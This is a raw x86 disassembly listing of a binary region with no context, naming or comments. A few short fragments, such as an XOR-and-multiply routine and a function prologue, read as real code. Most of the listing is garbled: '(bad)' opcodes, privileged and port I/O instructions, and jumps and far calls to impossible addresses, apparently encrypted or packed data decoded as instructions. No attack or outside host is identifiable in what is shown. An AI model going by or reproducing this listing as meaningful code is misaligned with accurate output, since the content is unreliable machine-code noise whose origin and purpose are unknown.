  4051cc:	pusha  
  4051cd:	sub    al,0x67
  4051cf:	(bad)  
  4051d0:	jecxz  0x405165
  4051d2:	push   ss
  4051d3:	das    
  4051d4:	mov    bl,0xd3
  4051d6:	mov    ebx,0xd93e16af
  4051db:	lods   al,BYTE PTR ds:[esi]
  4051dc:	push   edi
  4051dd:	cmp    DWORD PTR [ebp+0x17],ebx
  4051e0:	jl     0x405175
  4051e2:	jmp    FWORD PTR [ebx+0x61d05543]
  4051e8:	and    esp,DWORD PTR [ebp-0x1a89b9f6]
  4051ee:	jbe    0x405185
  4051f0:	sub    al,0xec
  4051f2:	es and eax,0xf12bf54b
  4051f8:	loope  0x40523f
  4051fa:	lods   eax,DWORD PTR ds:[esi]
  4051fb:	hlt    
  4051fc:	pop    DWORD PTR [eax-0x1ab36386]
  405202:	ja     0x4051fa
  405204:	cdq    
  405205:	mov    eax,esp
  405207:	imul   eax,DWORD PTR [esi+0x76],0x4387ac6a
  40520e:	pop    ebp
  40520f:	sub    al,0x7b
  405211:	outs   dx,DWORD PTR ds:[esi]
  405212:	(bad)  
  405213:	popa   
  405214:	outs   dx,BYTE PTR ds:[esi]
  405215:	or     edx,DWORD PTR [ecx-0x167fd52c]
  40521b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40521c:	sbb    dl,BYTE PTR [esi-0x4d3bc964]
  405222:	stc    
  405223:	fbstp  TBYTE PTR [esp+ebx*8]
  405226:	jnp    0x405208
  405228:	cld    
  405229:	in     al,0xf1
  40522b:	jle    0x40528c
  40522d:	lahf   
  40522e:	(bad)  
  40522f:	lock dec eax
  405231:	fs cwde 
  405233:	mov    esp,0x851a6086
  405238:	xchg   ebx,eax
  405239:	ins    DWORD PTR es:[edi],dx
  40523a:	mov    DWORD PTR [di+0xc],eax
  40523e:	mov    eax,DWORD PTR [ebp-0x4]
  405241:	mov    esi,DWORD PTR [ebp-0x8]
  405244:	xor    eax,edx
  405246:	xor    esi,edx
  405248:	add    eax,ecx
  40524a:	add    esi,ecx
  40524c:	imul   eax,esi
  40524f:	mov    esi,DWORD PTR [ebp+0xc]
  405252:	cmp    esi,eax
  405254:	mov    eax,DWORD PTR [ebp-0x4]
  405257:	je     0x405025
  40525d:	xor    eax,edx
  40525f:	add    eax,ecx
  405261:	mov    ecx,DWORD PTR [ebp+0xc]
  405264:	imul   eax,ecx
  405267:	add    eax,DWORD PTR [ebp+0x8]
  40526a:	mov    DWORD PTR [ebp+0xc],eax
  40526d:	mov    eax,DWORD PTR [ebp+0xc]
  405270:	pop    esi
  405271:	leave  
  405272:	ret    0x8
  405275:	push   ebp
  405276:	mov    ebp,esp
  405278:	push   ecx
  405279:	jmp    0x4055dc
  40527e:	sahf   
  40527f:	jb     0x40520d
  405281:	push   edx
  405282:	pop    esp
  405283:	jl     0x4052ed
  405285:	jb     0x405286
  405287:	ret    
  405288:	mov    ebx,0x63acff39
  40528d:	and    DWORD PTR [ebx+0x2a],ebx
  405290:	jle    0x405310
  405292:	les    edi,FWORD PTR [ecx+0x7e]
  405295:	jle    0x405246
  405297:	dec    ebx
  405298:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405299:	pop    edx
  40529a:	and    BYTE PTR [edx+0x7bdd7013],0x7
  4052a1:	retf   0xc10
  4052a4:	frstor [edi]
  4052a6:	clc    
  4052a7:	jae    0x405244
  4052a9:	icebp  
  4052aa:	ret    
  4052ab:	test   BYTE PTR [eax-0x7712f136],0xd
  4052b2:	scas   eax,DWORD PTR es:[edi]
  4052b3:	mov    DWORD PTR [esi+eiz*2],edi
  4052b6:	in     eax,dx
  4052b7:	xchg   ebp,eax
  4052b8:	lods   al,BYTE PTR ds:[esi]
  4052b9:	push   ds
  4052ba:	(bad)  
  4052bb:	pop    ss
  4052bc:	xlat   BYTE PTR ds:[ebx]
  4052bd:	add    ah,BYTE PTR [ebx+eax*1]
  4052c0:	xchg   ecx,eax
  4052c1:	add    edi,DWORD PTR [ecx-0x34]
  4052c4:	retf   0x8d7b
  4052c7:	and    eax,0x2eb76269
  4052cc:	fld    DWORD PTR [edx-0x48cbfc58]
  4052d2:	mov    edi,0x4850256b
  4052d7:	out    dx,al
  4052d8:	cmp    eax,0xd36020f0
  4052dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4052de:	mov    ebx,0xf5c4ae0b
  4052e3:	adc    DWORD PTR [edi],ecx
  4052e5:	xor    cl,ch
  4052e7:	pop    ebp
  4052e8:	mov    esp,0x362d2069
  4052ee:	aad    0x51
  4052f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052f1:	cmp    DWORD PTR [ebp+0x72],edx
  4052f4:	and    ebx,edi
  4052f6:	inc    ebp
  4052f7:	pop    ebp
  4052f8:	and    DWORD PTR [ebx-0x7e5fc3c],esp
  4052fe:	in     al,dx
  4052ff:	das    
  405300:	lock add bl,ah
  405303:	test   al,0xa9
  405305:	clc    
  405306:	sub    bl,BYTE PTR [esi-0x54e5b8df]
  40530c:	int3   
  40530d:	fnsave [ebp+0x57b4bc0a]
  405313:	(bad)
  405317:	adc    BYTE PTR [ecx+0x31308d2],0x8a
  40531e:	clc    
  40531f:	aas    
  405320:	inc    esp
  405321:	mov    WORD PTR [eax-0x20],es
  405324:	dec    ebx
  405325:	jge    0x405355
  405327:	mov    ah,0x8a
  405329:	dec    esi
  40532a:	sub    ch,cl
  40532c:	adc    esi,DWORD PTR [ecx-0x90d85c0]
  405332:	imul   edx,ebx,0xffffff93
  405335:	mov    DWORD PTR [edi-0x24abff9f],eax
  40533b:	stos   BYTE PTR es:[edi],al
  40533c:	pop    esp
  40533d:	outs   dx,DWORD PTR ds:[esi]
  40533e:	inc    esi
  40533f:	shl    DWORD PTR [edi],cl
  405341:	add    esp,DWORD PTR [ebx+0x166824a6]
  405347:	push   esi
  405348:	jge    0x40533f
  40534a:	add    DWORD PTR [esi-0x54],edx
  40534d:	std    
  40534e:	push   ebp
  40534f:	shl    ebp,1
  405351:	push   ds
  405352:	test   al,0xc9
  405354:	out    dx,al
  405355:	sahf   
  405356:	cli    
  405357:	xchg   edi,eax
  405358:	call   0x8f587caa
  40535d:	inc    ebx
  40535e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40535f:	xor    ah,BYTE PTR [eax-0x9]
  405362:	(bad)  
  405363:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405364:	mov    esi,0xc2fbd43
  405369:	ins    BYTE PTR es:[edi],dx
  40536a:	daa    
  40536b:	in     eax,0xc0
  40536d:	dec    esp
  40536e:	mov    ?,WORD PTR [eax+ebp*8-0x1aa2e3bd]
  405375:	aas    
  405376:	out    dx,eax
  405377:	push   ebx
  405378:	or     al,BYTE PTR [edi]
  40537a:	bound  esp,QWORD PTR [esi-0x22]
  40537d:	push   es
  40537e:	dec    esi
  40537f:	out    dx,al
  405380:	inc    eax
  405381:	xor    eax,0x718107de
  405386:	mov    al,ds:0x607ad4c9
  40538b:	pop    edi
  40538c:	fld    st(1)
  40538e:	or     al,0x26
  405390:	aam    0xbc
  405392:	ror    DWORD PTR [esp+ebp*1+0x73],cl
  405396:	cmp    DWORD PTR [ecx-0x1c0d4f60],esp
  40539c:	ret    
  40539d:	or     al,BYTE PTR [ebx]
  40539f:	ror    BYTE PTR [esp+ecx*1-0x79a55c70],0x99
  4053a7:	clc    
  4053a8:	dec    edx
  4053a9:	mov    edi,0x106d00b
  4053ae:	mov    edx,0x85719dcc
  4053b3:	inc    edi
  4053b4:	mov    ds:0x6276814f,al
  4053b9:	into   
  4053ba:	scas   al,BYTE PTR es:[edi]
  4053bb:	sahf   
  4053bc:	sbb    ah,BYTE PTR [eax+eiz*2-0x76d9c3ee]
  4053c3:	lods   eax,DWORD PTR ds:[esi]
  4053c4:	stos   DWORD PTR es:[edi],eax
  4053c5:	fcom   QWORD PTR [esi+0x2]
  4053c8:	int3   
  4053c9:	push   esi
  4053ca:	push   edi
  4053cb:	xchg   ebx,eax
  4053cc:	pop    esp
  4053cd:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4053cf:	rol    BYTE PTR [eax],cl
  4053d1:	popf   
  4053d2:	mov    eax,0x92bfb3c3
  4053d7:	(bad)  
  4053d8:	cld    
  4053d9:	mov    ecx,0x978c6eb
  4053de:	dec    eax
  4053df:	pop    ebx
  4053e0:	add    BYTE PTR [esi-0x23839fec],dh
  4053e6:	inc    edx
  4053e7:	daa    
  4053e8:	jp     0x4053da
  4053ea:	push   eax
  4053eb:	cmp    cl,BYTE PTR [eax]
  4053ed:	stc    
  4053ee:	inc    eax
  4053ef:	fld    DWORD PTR [edx+0x10]
  4053f2:	jbe    0x4053aa
  4053f4:	mov    ss,WORD PTR [ecx-0x58887e3e]
  4053fa:	jns    0x405443
  4053fc:	or     ah,BYTE PTR [ebp+edx*1-0x34]
  405400:	fstp   DWORD PTR [ebx]
  405402:	mov    al,0xd6
  405404:	aaa    
  405405:	mov    bh,0xa3
  405407:	pop    esi
  405408:	retf   
  405409:	neg    DWORD PTR [eax]
  40540b:	pushf  
  40540c:	jae    0x4053fb
  40540e:	fisttp QWORD PTR [ebx-0x732ab3e]
  405414:	mov    ebp,0xab1a825e
  405419:	pop    esp
  40541a:	xor    dh,0x3e
  40541d:	mov    edx,0x731d588e
  405422:	xchg   edx,eax
  405423:	sar    BYTE PTR [edi],0x42
  405426:	jb     0x405489
  405428:	cmp    BYTE PTR ds:0x67ed7db2,0xbe
  40542f:	add    edi,0xfffffff3
  405432:	xchg   ecx,eax
  405433:	lods   eax,DWORD PTR ds:[esi]
  405434:	sbb    DWORD PTR [ebp+eiz*8+0x5b],ebx
  405438:	jl     0x405466
  40543a:	push   edx
  40543b:	mov    ecx,0xbb8da3a7
  405440:	aaa    
  405441:	cmp    al,BYTE PTR [edx+0x2aee6ec6]
  405447:	sbb    al,0xc8
  405449:	adc    ebp,ebx
  40544b:	and    dh,BYTE PTR [edi+0x44]
  40544e:	pop    edi
  40544f:	xlat   BYTE PTR ds:[ebx]
  405450:	mov    al,ds:0x7c7ee7ba
  405455:	or     eax,0xf0b559c9
  40545a:	mov    BYTE PTR [ecx],dh
  40545c:	sub    BYTE PTR [ecx],ch
  40545e:	pop    es
  40545f:	mov    ss,eax
  405461:	mov    ecx,ds
  405463:	in     al,dx
  405464:	inc    ebx
  405465:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405466:	push   ds
  405467:	icebp  
  405468:	mov    esp,esp
  40546a:	cmc    
  40546b:	pop    es
  40546c:	push   cs
  40546d:	xchg   edi,edx
  40546f:	out    dx,al
  405470:	mov    edi,0x542e4307
  405475:	rol    DWORD PTR [eax],0xd7
  405478:	mov    cl,BYTE PTR [ebx-0x2972471]
  40547e:	ins    BYTE PTR es:[edi],dx
  40547f:	mov    ebp,ebx
  405481:	not    BYTE PTR [ebp-0x5f]
  405484:	cmp    bl,cl
  405486:	adc    BYTE PTR [ecx],dh
  405488:	and    eax,0xd72e70d3
  40548d:	jno    0x405429
  40548f:	scas   al,BYTE PTR es:[edi]
  405490:	and    dl,dh
  405492:	and    al,0x10
  405494:	cmp    al,0x8d
  405496:	dec    esp
  405497:	enter  0x2e2,0xb
  40549b:	popa   
  40549c:	stos   DWORD PTR es:[edi],eax
  40549d:	jecxz  0x40550a
  40549f:	lea    esp,[edx+0x3f2fb8c1]
  4054a5:	push   ds
  4054a6:	jb     0x40550c
  4054a8:	aad    0xde
  4054aa:	jno    0x4054d1
  4054ac:	pop    ebp
  4054ad:	je     0x405473
  4054af:	std    
  4054b0:	imul   ebx,DWORD PTR [esi+ebp*1+0x3ef70fbf],0xfffffff9
  4054b8:	ror    cl,1
  4054ba:	sub    DWORD PTR [eax-0x9],esi
  4054bd:	pop    ds
  4054be:	daa    
  4054bf:	js     0x40553d
  4054c1:	fstp   QWORD PTR [edx]
  4054c3:	(bad)  
  4054c4:	bound  esp,QWORD PTR [eax+0x2af8601a]
  4054ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054cb:	push   edx
  4054cc:	sub    al,0x2f
  4054ce:	popf   
  4054cf:	push   0x81fd0c21
  4054d4:	aad    0xa8
  4054d6:	push   esi
  4054d7:	jb     0x4054d8
  4054d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054da:	pusha  
  4054db:	out    0x10,eax
  4054dd:	popa   
  4054de:	lahf   
  4054df:	inc    edi
  4054e0:	xlat   BYTE PTR ds:[ebx]
  4054e1:	jne    0x405513
  4054e3:	mov    dh,0xf1
  4054e5:	lods   eax,DWORD PTR ds:[esi]
  4054e6:	aas    
  4054e7:	(bad)  
  4054e8:	mov    esp,0xe0f97d83
  4054ed:	enter  0x13d5,0x12
  4054f1:	in     al,0xe3
  4054f3:	ds (bad) 
  4054f5:	ror    DWORD PTR [eax-0x47],1
  4054f8:	push   0xa8df31ca
  4054fd:	js     0x4054a3
  4054ff:	lods   al,BYTE PTR ds:[esi]
  405500:	imul   BYTE PTR [esi]
  405502:	add    esp,esp
  405504:	mov    bh,0xc5
  405506:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405507:	or     BYTE PTR [esi+0x5e83c35d],dl
  40550d:	dec    ecx
  40550e:	jno    0x4054f3
  405510:	out    0x4d,al
  405512:	test   al,0xfa
  405514:	sti    
  405515:	shl    DWORD PTR [ecx],cl
  405517:	inc    eax
  405518:	cs dec edi
  40551a:	pop    edx
  40551b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40551c:	cwde   
  40551d:	add    BYTE PTR [edi],bh
  40551f:	sahf   
  405520:	cwde   
  405521:	ret    0xe3f5
  405524:	sub    BYTE PTR [eax+0x76f389bf],al
  40552a:	pop    edi
  40552b:	mov    ah,0xf
  40552d:	dec    ebp
  40552e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40552f:	push   esi
  405530:	cmp    BYTE PTR ds:0x4b4de831,ch
  405536:	adc    eax,0x2dc22dfb
  40553b:	cmp    eax,0xf8c8f5f5
  405540:	mov    ch,ah
  405542:	dec    esp
  405543:	idiv   BYTE PTR [bp+di-0x34]
  405547:	jnp    0x40551c
  405549:	mov    es,WORD PTR [esi]
  40554b:	adc    cl,BYTE PTR [ecx-0x6f893730]
  405551:	mov    ecx,0x5bf13137
  405556:	mov    al,ds:0xd3bac8d1
  40555b:	push   eax
  40555c:	mov    bl,0x61
  40555e:	aaa    
  40555f:	ror    DWORD PTR [edx+0x79542219],0xe8
  405566:	mov    eax,ds:0x20dc006a
  40556b:	add    eax,0x5958e3a8
  405570:	fs mov ebx,0x47672d60
  405576:	sbb    DWORD PTR [ecx+0x1a],eax
  405579:	leave  
  40557a:	leave  
  40557b:	xchg   esi,eax
  40557c:	(bad)  
  40557d:	pop    ss
  40557e:	jns    0x40552c
  405580:	xor    al,0xab
  405582:	vmwrite ecx,esp
  405585:	xchg   esp,eax
  405586:	mul    dl
  405588:	push   ds
  405589:	sbb    al,0x4e
  40558b:	pop    es
  40558c:	(bad)
  40558f:	pop    ebp
  405590:	ror    ch,0x52
  405593:	sbb    DWORD PTR [ebx-0x4e956bf7],edi
  405599:	and    DWORD PTR [esp+edi*8],eax
  40559c:	sbb    eax,0xecfc246d
  4055a1:	mov    ds:0x1f2de371,al
  4055a6:	mov    ah,0xf8
  4055a8:	loopne 0x40553b
  4055aa:	add    dl,bl
  4055ac:	mov    edi,0xcff8abdd
  4055b1:	mov    al,ds:0x7a86083a
  4055b6:	scas   al,BYTE PTR es:[edi]
  4055b7:	push   edi
  4055b8:	mov    DWORD PTR ds:0x787faf65,edx
  4055be:	sub    esi,eax
  4055c0:	lahf   
  4055c1:	pop    es
  4055c2:	test   al,0x1
  4055c4:	leave  
  4055c5:	lea    edi,[edx+0x65]
  4055c8:	xor    bh,bl
  4055ca:	les    ecx,FWORD PTR [eax-0x62e08e0b]
  4055d0:	mov    ch,0xa0
  4055d2:	mov    ds:0xc52ea89f,al
  4055d7:	cmp    dl,0x42
  4055da:	sbb    edi,DWORD PTR [edx-0x36047af]
  4055e0:	mov    ds:0xfc458905,eax
  4055e5:	mov    DWORD PTR ds:0x4345f3,0x3619
  4055ef:	mov    ecx,DWORD PTR [ebp-0x4]
  4055f2:	jmp    0x405955
  4055f7:	xchg   esi,eax
  4055f8:	jb     0x405627
  4055fa:	jg     0x4055e9
  4055fc:	dec    ecx
  4055fd:	mov    esp,0x8b1aac73
  405602:	arpl   WORD PTR cs:[edx+0x36213870],dx
  405609:	jle    0x405689
  40560b:	les    edi,FWORD PTR [ecx+0x7e]
  40560e:	jle    0x405675
  405610:	in     al,dx
  405611:	push   ecx
  405612:	xor    BYTE PTR [ebx+0x2f2b4105],cl
  405618:	je     0x405640
  40561a:	mov    edi,0xe8070f60
  40561f:	in     al,0x2e
  405621:	in     al,dx
  405622:	fimul  WORD PTR [ebx+ebp*1-0x2f]
  405626:	sbb    ecx,DWORD PTR [esi]
  405628:	mov    al,ds:0xc9e649cc
  40562d:	push   cs
  40562e:	mov    edx,edi
  405630:	or     DWORD PTR [esi+0x29],ecx
  405633:	ret    0x2996
  405636:	(bad)
  405639:	aas    
  40563a:	ret    0x7e1
  40563d:	jnp    0x405604
  40563f:	jb     0x40567c
  405641:	mov    cl,0x42
  405643:	pop    ss
  405644:	retf   
  405645:	jmp    0x16ada573
  40564a:	mov    ah,0x8
  40564c:	fdivr  QWORD PTR [eax-0x30fed0f8]
  405652:	fisubr WORD PTR [eax-0x594cc198]
  405658:	or     ecx,DWORD PTR [esi]
  40565a:	or     DWORD PTR [edx-0x3a],esi
  40565d:	xchg   esp,eax
  40565e:	adc    edi,edi
  405660:	pop    ebp
  405661:	cmp    DWORD PTR [esi+0x54],esp
  405664:	lods   eax,DWORD PTR ds:[esi]
  405665:	cmp    esi,DWORD PTR [edx+0x60]
  405668:	sbb    ch,bl
  40566a:	pop    es
  40566b:	fcomi  st,st(3)
  40566d:	rol    DWORD PTR [ebx+0x1a65ae3d],1
  405673:	xor    al,0x5c
  405675:	and    ebp,esp
  405677:	adc    al,0xa7
  405679:	in     al,0x81
  40567b:	enter  0xb59e,0x2f
  40567f:	jb     0x405698
  405681:	xor    dh,BYTE PTR ds:0xe20b093d
  405687:	and    al,0xcb
  405689:	push   edi
  40568a:	push   eax
  40568b:	sub    esi,DWORD PTR [edi-0xa]
  40568e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40568f:	imul   edi,DWORD PTR [ebp-0x5e669719],0x37b9f5ad
  405699:	xchg   ebp,eax
  40569a:	mov    BYTE PTR [edi+0x760cfc35],dl
  4056a0:	sub    bh,BYTE PTR [eax-0x1919cfea]
  4056a6:	sub    esi,DWORD PTR [esi-0x45]
  4056a9:	lds    ebx,FWORD PTR [ebx-0x104d8617]
  4056af:	adc    edx,eax
  4056b1:	int3   
  4056b2:	nop
  4056b3:	or     ah,cl
  4056b5:	xchg   BYTE PTR fs:[edx-0x61],dh
  4056b9:	mov    ch,0x8d
  4056bb:	jmp    0x60b2ece9
  4056c0:	sbb    eax,0x6675aa17
  4056c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056c6:	int    0xd5
  4056c8:	add    dl,cl
  4056ca:	stos   BYTE PTR es:[edi],al
  4056cb:	push   ebx
  4056cc:	aas    
  4056cd:	aam    0x2e
  4056cf:	daa    
  4056d0:	dec    ebp
  4056d1:	pop    ecx
  4056d2:	xchg   ecx,eax
  4056d3:	adc    cl,0x5a
  4056d6:	jle    0x405745
  4056d8:	sbb    al,0x42
  4056da:	push   ecx
  4056db:	adc    DWORD PTR [ecx-0x16],esp
  4056de:	shl    BYTE PTR [edi+0x49],1
  4056e1:	and    bl,BYTE PTR [eax+edx*8-0x225b211c]
  4056e8:	fisub  WORD PTR [edi-0x1d]
  4056eb:	push   0x34
  4056ed:	cld    
  4056ee:	lea    edx,[edi]
  4056f0:	mov    edi,0x3bdf3f61
  4056f5:	cmp    esi,DWORD PTR [eax-0x1f]
  4056f8:	lods   eax,DWORD PTR ds:[esi]
  4056f9:	push   ebx
  4056fa:	pop    esi
  4056fb:	mov    ds:0x10d003d2,eax
  405700:	cld    
  405701:	xor    DWORD PTR [esp+esi*4+0x7e38eb0a],ebp
  405708:	dec    esi
  405709:	lock fnstcw WORD PTR [edx]
  40570c:	shl    DWORD PTR [ecx-0x43],cl
  40570f:	ins    DWORD PTR es:[edi],dx
  405710:	mov    ebp,0x1df7240e
  405715:	xchg   DWORD PTR ds:0x3057b7a2,edi
  40571b:	out    dx,eax
  40571c:	clc    
  40571d:	loop   0x4056b9
  40571f:	push   edx
  405720:	fistp  QWORD PTR [ecx]
  405722:	sub    esi,DWORD PTR [edx]
  405724:	sahf   
  405725:	(bad)  
  405726:	pop    ecx
  405727:	jno    0x405757
  405729:	jge    0x4056e1
  40572b:	and    BYTE PTR [eax+0x9],dh
  40572e:	mul    BYTE PTR [edx+0x1f2c428b]
  405734:	lock sub DWORD PTR [edx-0x6da5bb88],ebx
  40573b:	popa   
  40573c:	loop   0x40576d
  40573e:	lea    edx,[edx]
  405740:	xchg   DWORD PTR [ebx+0x1f],esi
  405743:	adc    DWORD PTR [esi+0x37b6632e],0xfffffff9
  40574a:	scas   al,BYTE PTR es:[edi]
  40574b:	loope  0x4056fe
  40574d:	jle    0x40571e
  40574f:	push   esp
  405750:	int    0x3a
  405752:	and    eax,ebp
  405754:	or     edx,DWORD PTR [ebx]
  405756:	add    eax,0xefdf0105
  40575b:	mov    cs,WORD PTR [edi-0xacdd5f9]
  405761:	ins    DWORD PTR es:[edi],dx
  405762:	loope  0x405798
  405764:	das    
  405765:	jg     0x405705
  405767:	sbb    ebx,ebx
  405769:	inc    esi
  40576a:	ds jl  0x40572d
  40576d:	and    DWORD PTR [ecx],eax
  40576f:	daa    
  405770:	std    
  405771:	push   ecx
  405772:	mov    ss,ebp
  405774:	add    al,0xe5
  405776:	xchg   edx,eax
  405777:	xor    DWORD PTR [ebp-0xa],ecx
  40577a:	jl     0x4057e6
  40577c:	or     BYTE PTR [ecx+0x61],0x73
  405780:	jmp    esi
  405782:	adc    DWORD PTR [ebp-0x26bd89d6],eax
  405788:	call   0xe567:0xb0e05e91
  40578f:	adc    al,0xbc
  405791:	cli    
  405792:	cmp    BYTE PTR [ebx-0x32a8bdcf],dh
  405798:	cmp    al,0xbf
  40579a:	aaa    
  40579b:	xchg   bl,bh
  40579d:	loope  0x40577f
  40579f:	inc    esi
  4057a0:	push   ds
  4057a1:	push   edx
  4057a2:	shl    BYTE PTR [eax+eiz*1+0x64ee0113],0xf1
  4057aa:	out    0xa1,eax
  4057ac:	jmp    0x5fe16dc
  4057b1:	or     cl,bl
  4057b3:	mov    DWORD PTR [edi],ebp
  4057b5:	push   ebx
  4057b6:	pushf  
  4057b7:	rol    BYTE PTR [esi-0x16],cl
  4057ba:	xchg   ebx,eax
  4057bb:	push   ebp
  4057bc:	scas   al,BYTE PTR es:[edi]
  4057bd:	sub    eax,0x13ac6be3
  4057c2:	cvtdq2ps xmm0,xmm0
  4057c5:	jb     0x40580b
  4057c7:	and    BYTE PTR [esi+0x44a1b724],cl
  4057cd:	adc    eax,0x6e15fa97
  4057d2:	imul   edx,ebx,0xffffff85
  4057d5:	xchg   BYTE PTR [ebx-0x79],al
  4057d8:	pop    ecx
  4057d9:	inc    esp
  4057da:	pop    esi
  4057db:	test   esp,0xb8be6b27
  4057e1:	jmp    0xf5902832
  4057e6:	dec    ebp
  4057e7:	dec    esp
  4057e8:	pop    esp
  4057e9:	xchg   esi,eax
  4057ea:	shl    BYTE PTR [ebp+0x7e45238d],cl
  4057f0:	fcomp  QWORD PTR [eax+0x4a]
  4057f3:	jb     0x405777
  4057f5:	jmp    0x40585b
  4057f7:	dec    ecx
  4057f8:	pop    edi
  4057f9:	mov    bh,0xba
  4057fb:	fld    TBYTE PTR [ecx+0x2f]
  4057fe:	sbb    bl,BYTE PTR [ecx+ecx*1]
  405801:	mov    ss,WORD PTR [edi+0x300a72cd]
  405807:	dec    edi
  405808:	lahf   
  405809:	ror    BYTE PTR [ecx-0x365a3612],0xf7
  405810:	popa   
  405811:	push   edx
  405812:	push   eax
  405813:	in     al,dx
  405814:	jmp    0xd924ea52
  405819:	inc    eax
  40581a:	mul    BYTE PTR [edx]
  40581c:	mov    dh,BYTE PTR [ebx]
  40581e:	cmc    
  40581f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405820:	and    BYTE PTR [edx+edi*8],ah
  405823:	jae    0x405813
  405825:	and    BYTE PTR [ecx],cl
  405827:	outs   dx,DWORD PTR ds:[esi]
  405828:	ret    
  405829:	mov    ebx,ebp
  40582b:	ins    BYTE PTR es:[edi],dx
  40582c:	inc    ebp
  40582d:	pop    es
  40582e:	and    DWORD PTR ds:0x4066f939,0x88e9b0ec
  405838:	xchg   edi,eax
  405839:	scas   eax,DWORD PTR es:[edi]
  40583a:	loopne 0x40580b
  40583c:	gs inc edx
  40583e:	xlat   BYTE PTR ds:[ebx]
  40583f:	rcl    bl,0xe
  405842:	cmp    eax,0xb82a7619
  405847:	or     ecx,ebx
  405849:	sub    DWORD PTR [ecx+0xd],edx
  40584c:	or     eax,0xfab298f4
  405851:	mov    al,ds:0x644eb876
  405856:	push   cs
  405857:	pcmpgtb mm5,QWORD PTR [esi-0x5f]
  40585b:	fs and DWORD PTR ds:[edx+0x5b344677],eax
  405863:	loop   0x4058aa
  405865:	push   ebx
  405866:	repnz pop es
  405868:	inc    edx
  405869:	lds    edx,FWORD PTR [ebx]
  40586b:	cmp    BYTE PTR [ecx],bh
  40586d:	outs   dx,BYTE PTR ds:[esi]
  40586e:	mov    DWORD PTR [ebx-0x3e],edi
  405871:	jnp    0x4057f9
  405873:	(bad)  
  405875:	mov    dl,0xcb
  405877:	mov    esi,0xa6a44e30
  40587c:	mov    eax,ds:0xa3f1fa70
  405881:	adc    ebx,DWORD PTR [ebx]
  405883:	js     0x40583c
  405885:	inc    eax
  405886:	and    ah,ch
  405888:	(bad)  
  405889:	or     eax,eax
  40588b:	(bad)  
  40588c:	fmul   DWORD PTR [edx]
  40588e:	mov    ds:0x3be41d0d,eax
  405893:	ror    BYTE PTR [eax],0xca
  405896:	add    BYTE PTR [ebp+eiz*8-0x72eb9873],0x84
  40589e:	psllq  mm1,mm5
  4058a1:	sbb    DWORD PTR [edi],0x77
  4058a4:	outs   dx,BYTE PTR ds:[esi]
  4058a5:	iret   
  4058a6:	sbb    BYTE PTR [edi],ch
  4058a8:	ds push ecx
  4058aa:	daa    
  4058ab:	xchg   BYTE PTR [eax-0x19aac430],ch
  4058b1:	out    0x88,al
  4058b3:	into   
  4058b4:	rcl    BYTE PTR [edi+0x38],1
  4058b7:	sahf   
  4058b8:	mov    ah,bl
  4058ba:	xlat   BYTE PTR ds:[ebx]
  4058bb:	jo     0x40584a
  4058bd:	pop    ebx
  4058be:	sub    ecx,DWORD PTR [eax-0x5b]
  4058c1:	jle    0x40585b
  4058c3:	pop    edi
  4058c4:	xor    al,0xad
  4058c6:	jecxz  0x405892
  4058c8:	lock scas al,BYTE PTR es:[edi]
  4058ca:	in     al,0xf
  4058cc:	jno    0x4058d8
  4058ce:	in     eax,0x7c
  4058d0:	pop    esp
  4058d1:	add    al,0x5c
  4058d3:	xchg   edi,eax
  4058d4:	je     0x405944
  4058d6:	test   DWORD PTR [eax-0x7fcda7fd],edi
  4058dc:	mov    al,ds:0xc3132f79
  4058e1:	cdq    
  4058e2:	loope  0x4058ef
  4058e4:	inc    ebx
  4058e5:	es daa 
  4058e7:	dec    ebp
  4058e8:	aam    0x94
  4058ea:	sbb    eax,0xbb7fcb36
  4058ef:	outs   dx,DWORD PTR ds:[esi]
  4058f0:	mov    DWORD PTR [edx-0x28],ebx
  4058f3:	lahf   
  4058f4:	push   esi
  4058f5:	cmp    al,0x1e
  4058f7:	sub    DWORD PTR [ebp*1+0x52557013],esi
  4058fe:	mov    edx,0xc5da10e2
  405903:	not    DWORD PTR [edi]
  405905:	sbb    DWORD PTR [esp+edi*8],esi
  405908:	mov    ebx,0xba961680
  40590d:	xor    al,0x30
  40590f:	(bad)
  405912:	gs jecxz 0x4058b1
  405915:	push   ebp
  405916:	add    al,0xb6
  405918:	(bad)  [edi-0x31e98ae3]
  40591e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40591f:	adc    bh,BYTE PTR [eax+0x48]
  405922:	arpl   bp,sp
  405924:	call   0xff31:0xfb1c0e13
  40592b:	dec    esp
  40592c:	push   edx
  40592d:	fstp   DWORD PTR [esi+0x729af49b]
  405933:	mov    edx,0x26f13bea
  405938:	xor    BYTE PTR [ecx],bl
  40593a:	fadd   DWORD PTR [eax-0xed13515]
  405940:	mov    bl,0xb8
  405942:	push   eax
  405943:	jmp    0xe96b:0x971b6fb0
  40594a:	jo     0x405926
  40594c:	test   eax,0xc27b8939
  405951:	xchg   ecx,eax
  405952:	or     eax,0x45c7e73b
  405957:	clc    
  405958:	cmp    DWORD PTR [edi+0x0],ecx
  40595b:	add    bh,al
  40595d:	add    eax,0x4346d3
  405962:	dec    edx
  405963:	and    al,BYTE PTR [eax]
  405965:	add    cl,ch
  405967:	pop    esi
  405968:	add    eax,DWORD PTR [eax]
  40596a:	add    BYTE PTR [edx+0x71b8a1ab],bh
  405970:	pop    esp
  405971:	arpl   WORD PTR [ebp-0x4d872e44],si
  405977:	push   0xffffffd6
  405979:	mov    ds:0x7e31ef44,al
  40597e:	jle    0x405944
  405980:	jns    0x405a00
  405982:	jle    0x40592c
  405984:	push   esi
  405985:	gs popa 
  405987:	jmp    0x67a65641
  40598c:	sti    
  40598d:	jne    0x40596a
